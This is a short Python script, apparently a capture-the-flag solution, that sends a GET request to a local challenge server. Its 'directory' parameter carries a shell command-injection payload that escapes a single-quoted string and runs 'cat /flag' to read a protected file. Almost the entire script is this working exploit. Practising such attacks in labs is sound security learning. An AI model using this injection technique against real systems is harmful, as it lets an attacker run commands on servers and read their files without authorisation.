from requests import request

method = "GET"
site = "http://challenge.localhost"
port = 80

# Exploit single quotes.
params = { "directory": "' || cat /flag #" }

url = f"{site}:{port}/"

response = request(method, url, params = params)

print(f"\nResponse: {response.text}")
